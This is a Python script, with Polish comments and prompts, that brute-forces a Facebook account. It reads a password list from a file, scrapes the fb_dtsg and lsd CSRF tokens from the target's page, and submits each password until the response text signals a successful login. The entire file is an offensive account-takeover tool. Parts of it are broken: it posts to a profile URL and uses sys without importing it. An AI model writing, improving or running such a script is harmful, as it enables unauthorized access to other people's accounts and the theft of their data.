import requests

def brute_force(username, fb_id, passwords):
    url = f'https://www.facebook.com/{fb_id}'

    with requests.Session() as session:
        # Pobierz stronę logowania, aby uzyskać niezbędne tokeny
        response = session.get(url)
        try:
            response.raise_for_status()
        except requests.exceptions.HTTPError as errh:
            print ("HTTP Error:",errh)
        except requests.exceptions.ConnectionError as errc:
            print ("Error Connecting:",errc)
        except requests.exceptions.Timeout as errt:
            print ("Timeout Error:",errt)
        except requests.exceptions.RequestException as err:
            print ("Error:",err)
            sys.exit(1)

        # Wyszukaj ukryte pola z tokenami CSRF
        csrf_token = response.text.split('name="fb_dtsg" value="')[1].split('"')[0]
        lsd_token = response.text.split('name="lsd" value="')[1].split('"')[0]

        for password in passwords:
            data = {
                'email': username,
                'pass': password,
                'fb_dtsg': csrf_token,
                'lsd': lsd_token
            }

            response = session.post(url, data=data)

            if 'Find Friends' in response.text:
                print(f'Prawidłowe hasło znalezione: {password}')
                break
            else:
                print(f'Nieprawidłowe hasło: {password}')

def main():
    email = input('Podaj adres e-mail (jako nazwę użytkownika): ')
    fb_id = input('Podaj identyfikator Facebooka: ')
    password_file = input('Podaj nazwę pliku z hasłami: ')

    with open(password_file, 'r') as file:
        passwords = [line.strip() for line in file]

    brute_force(email, fb_id, passwords)

if __name__ == '__main__':
    main()



